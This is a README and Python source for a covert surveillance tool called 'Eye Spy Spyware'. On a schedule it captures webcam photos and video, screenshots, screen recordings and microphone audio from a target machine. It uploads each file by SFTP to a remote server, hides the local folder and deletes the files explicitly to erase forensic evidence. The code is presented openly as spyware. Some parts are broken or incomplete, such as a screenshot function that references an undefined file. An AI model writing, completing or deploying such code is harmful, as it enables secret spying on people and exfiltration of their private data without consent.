Overview

Eye Spy Spyware is a Python CLI-based spyware tool that allows you to perform various surveillance actions on a target system. All captured data is automatically sent to a remote server via SSH/SFTP and then deleted from the local machine to minimize forensic traces.

Features

  • Take Webcam Photos
  • Record Webcam Videos
  • Capture Screenshots
  • Record Screen Activity
  • Record Microphone Audio
  • Schedule Actions at Specific Times
  • Automatic File Upload to Remote Server
  • Auto-Delete Local Files After Upload
  • Hidden Local Storage Folder

Configuration

Before running the spyware, you need to configure the SSH connection details and file paths in the script:

Configuration Variables 
ssh_host = "your.server.com"
ssh_port = "22"

Usage Examples

The spyware uses command-line arguments to configure what actions to perform, when to perform them, and for how long.

Example 1: Take a Webcam Photo at 3:54 AM 
python input.py -EnableWebcamPhoto -TimeForWebcamPhoto "3:54am"
Example 2: Multiple Actions at Once 
python input.py -EnableWebcamPhoto -TimeForWebcamPhoto "3:54am" \
                -EnableScreenshot -TimeForScreenshot "3:54am" \
                -EnableScreenRecord -TimeForScreenRecord "3:54am" -DurationForScreenRecord 5
Example 3: Record Webcam Video for 30 Seconds 
python input.py -EnableWebcamVideo -TimeForWebcamVideo "2:30pm" -DurationForWebcamVideo 30
Example 4: Multiple Scheduled Times 
python input.py -EnableScreenshot -TimeForScreenshot "9:00am" "12:00pm" "5:00pm"
Example 5: Record Microphone for 60 Seconds 
python input.py -EnableMicrophoneRecording -TimeForMicrophoneRecording "10:00am" \
                -DurationForMicrophoneRecording 60

Command-Line Arguments

Enable Flags:

  • -EnableWebcamPhoto - Enable webcam photo capture
  • -EnableScreenshot - Enable screenshot capture
  • -EnableScreenRecord - Enable screen recording
  • -EnableWebcamVideo - Enable webcam video recording
  • -EnableMicrophoneRecording - Enable microphone recording

Time Arguments:

  • -TimeForWebcamPhoto - Schedule time(s) for webcam photos
  • -TimeForScreenshot - Schedule time(s) for screenshots
  • -TimeForScreenRecord - Schedule time(s) for screen recordings
  • -TimeForWebcamVideo - Schedule time(s) for webcam videos
  • -TimeForMicrophoneRecording - Schedule time(s) for microphone recordings

Duration Arguments (in seconds):

  • -DurationForScreenRecord - Duration for screen recording
  • -DurationForWebcamVideo - Duration for webcam video
  • -DurationForMicrophoneRecording - Duration for microphone recording

How It Works

1. Scheduling: The program uses the schedule library to run tasks at specified times. It runs continuously in the background, checking every second if it's time to execute a scheduled action.

2. Data Capture: When a scheduled time arrives, the appropriate capture function is executed:

  • Webcam photos/videos use OpenCV (cv2)
  • Screenshots use PyAutoGUI
  • Screen recordings combine PyAutoGUI screenshots into a video
  • Microphone recordings use SoundDevice

3. File Storage: Captured files are temporarily saved to a hidden folder on the local machine with timestamps in the filename format: ActionName_DD-MM-YYYY_HH-MM-SS_AM/PM.extension

4. Remote Transfer: Files are immediately transferred to the remote server via SFTP using the Paramiko library.

5. Cleanup: After successful upload, the local file is automatically deleted to remove evidence.

def parse_time(time_str):
    try:
        time_str = time_str.lower().replace(" ", "")
        
        if not re.match(r'^\d{1,2}:\d{2}(am|pm)$', time_str):
            raise ValueError("Invalid time format. Use format like '3:30pm' or '10:45am'")
            
        time = datetime.datetime.strptime(time_str, "%I:%M%p")
        return {
            'display': time.strftime("%I:%M%p").lower(),  
            'schedule': time.strftime("%H:%M"),
        }
    except ValueError as e:
        raise argparse.ArgumentTypeError(str(e))


def parse_duration(value):
    try:
        minutes = int(value)
        if minutes <= 0:
            raise argparse.ArgumentTypeError("Duration must be greater than 0 minutes")
        return minutes
    except ValueError:
        raise argparse.ArgumentTypeError(f"'{value}' Please use positive integer")

def save_file(name, extension):
    timestamp = time.strftime("%d-%m-%Y_%I-%M-%S_%p")
    file_name = f"{name}_{timestamp}.{extension}"

    try:
        path = ""
        os.makedirs(path, exist_ok=True)
        hide_folder(path)
        return os.path.join(path, file_name)
    except Exception as e:
        pass


def delete_file(file):
    if os.path.exists(file):
        os.remove(file)


def hide_folder(folder_path):
    os.system(f'attrib +h "{folder_path}"')


def send_file(host, port, username, password, local_file_path, remote_dir_path):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=int(port), username=username, password=password)
        
        sftp = ssh.open_sftp()
        
        filename = os.path.basename(local_file_path)
        remote_dir_path = remote_dir_path.replace('/', '\\')
        remote_file = f"{remote_dir_path}\\{filename}"
        
        try:
            sftp.stat(remote_dir_path)
        except FileNotFoundError:
            stdin, stdout, stderr = ssh.exec_command(f'mkdir "{remote_dir_path}"')
        
        sftp.put(local_file_path, remote_file)
        print("File sent to server.")
        
        sftp.close()
        ssh.close()
    except Exception as e:
        sftp.close()
        ssh.close()


def microphone_record(duration):
    try:
        sampling_rate = 48000
        audio = sounddevice.rec(int(sampling_rate*duration), samplerate=sampling_rate, channels=2, dtype='int16')
        sounddevice.wait()
        file = save_file("Microphone Recording","wav")
        if file:
            write(file, sampling_rate, audio)
            send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
            delete_file(file)
    except Exception:
        pass


def screenshot():

    delete_file(file)


def webcam_photo():
    camera = cv2.VideoCapture(0)
    try:
        ret, frame = camera.read()
        if ret:
            file = save_file("Webcam Photo", "jpg")
            cv2.imwrite(file, frame)
            send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
            delete_file(file)
    finally:
        camera.release()
        cv2.destroyAllWindows()


def screenrecord(duration):
    screen_width, screen_height = pyautogui.size()
    fourcc = cv2.VideoWriter.fourcc(*"mp4v")
    fps = 10
    file = save_file("Screen Recording","mp4")
    out = cv2.VideoWriter(file, fourcc, fps, (screen_width, screen_height))
    
    start_time = time.time()
    
    while time.time() - start_time < duration:
        screenshot = pyautogui.screenshot()
        frame = numpy.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)

    out.release()
    send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
    delete_file(file)


def webcam_video(duration):
    camera = cv2.VideoCapture(0)
    try:
        if not camera.isOpened():
            return

        width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))

        file = save_file("Webcam_video", "avi")
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter(file, fourcc, 20.0, (width, height))

        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = camera.read()
            if not ret:
                break
            out.write(frame)

        out.release()
        send_file(ssh_host, ssh_port, ssh_username, ssh_password, file, remote_file_path)
        delete_file(file)
    finally:
        camera.release()
        cv2.destroyAllWindows()


def schedule_action(action_func, times, duration=None):
    for time_dict in times:
        time_str = time_dict['schedule']
        if duration is not None:
            schedule.every().day.at(time_str).do(action_func, duration)
        else:
            schedule.every().day.at(time_str).do(action_func)
        if duration is not None:
            print(f"Scheduled {action_func.__name__} at {time_dict['display']} for {duration} seconds")
        else:
            print(f"Scheduled {action_func.__name__} at {time_dict['display']}")

def run_scheduler():
    while True:
        schedule.run_pending()
        time.sleep(1)
